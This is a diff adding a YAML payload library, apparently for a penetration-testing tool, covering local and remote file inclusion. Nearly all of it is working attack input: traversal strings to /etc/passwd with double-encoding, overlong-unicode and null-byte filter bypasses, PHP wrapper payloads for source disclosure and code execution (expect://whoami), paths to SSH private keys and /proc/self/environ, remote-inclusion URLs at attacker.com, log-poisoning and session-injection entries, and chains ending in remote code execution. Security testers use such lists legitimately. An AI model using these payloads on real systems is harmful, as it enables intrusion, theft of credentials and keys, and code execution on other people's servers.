@@ -1,0 +1,106 @@
+name: File Inclusion (LFI/RFI)
+description: LFI, RFI, and path traversal with bypass techniques for filters and encoding.
+basic_payloads:
+- ../../../etc/passwd
+- '....//....//....//etc/passwd'
+- file:///etc/passwd
+bypass_techniques:
+- name: Double Encoding
+  description: Double URL-encode traversal
+  payloads:
+  - '%252e%252e%252fetc/passwd'
+  - ..%252f..%252f..%252fetc/passwd
+- name: Unicode Encoding
+  description: Overlong unicode sequences
+  payloads:
+  - ..%c0%ae..%c0%ae..%c0%aeetc/passwd
+  - ..%e0%80%af..%e0%80%afetc/passwd
+- name: Nested Traversal
+  description: Nested traversal sequences
+  payloads:
+  - '....//....//....//etc/passwd'
+  - '....\\....\\windows\\win.ini'
+- name: Null Byte
+  description: Null byte truncation
+  payloads:
+  - ../../../etc/passwd%00
+  - ../../../etc/passwd%00.html
+- name: PHP Base64 Wrapper
+  description: Read PHP files as base64
+  payloads:
+  - php://filter/convert.base64-encode/resource=index.php
+  - php://filter/read=convert.base64-encode/resource=config.php
+- name: PHP Input Wrapper
+  description: Use php://input for POST data execution
+  payloads:
+  - php://input
+- name: PHP Data Wrapper
+  description: Use data:// wrapper for code execution
+  payloads:
+  - data://text/plain;base64,...
+- name: PHP Expect Wrapper
+  description: Use expect:// for RCE
+  payloads:
+  - expect://whoami
+  - expect://id
+- name: Proc Filesystem
+  description: Read /proc for process info
+  payloads:
+  - /proc/self/environ
+  - /proc/self/cmdline
+  - /proc/self/fd/0
+  - /proc/1/cmdline
+- name: Log Files
+  description: Read system logs
+  payloads:
+  - /var/log/apache2/access.log
+  - /var/log/nginx/access.log
+  - /var/log/auth.log
+- name: Config Files
+  description: Read sensitive config files
+  payloads:
+  - /etc/apache2/apache2.conf
+  - /etc/nginx/nginx.conf
+  - /etc/hosts
+  - /etc/hostname
+- name: SSH Keys
+  description: Read SSH private keys
+  payloads:
+  - /home/user/.ssh/id_rsa
+  - /root/.ssh/id_rsa
+- name: Remote File Inclusion
+  description: Include remote files
+  payloads:
+  - http://attacker.com/shell.txt?
+  - https://attacker.com/evil.txt?
+- name: Log Poisoning
+  description: Inject PHP into logs for RCE
+  payloads:
+  - 'User-Agent: injected PHP code'
+  - 'Referer: injected PHP code'
+- name: Session File Injection
+  description: Inject into PHP session files
+  payloads:
+  - /../../../../tmp/sess_attacker
+  - /../../../var/lib/php/sessions/sess_attacker
+detection_patterns:
+- include(
+- require(
+- file_get_contents
+- file=
+- page=
+- path=
+- template=
+- load=
+- document=
+chain_templates:
+- name: LFI -> Log Poisoning -> RCE
+  description: RCE via LFI and log poisoning
+  requirements:
+  - lfi
+  - writable_logs
+- name: LFI -> PHP Wrapper -> Source Code
+  description: Read PHP source via wrapper
+  requirements:
+  - lfi
+  - php
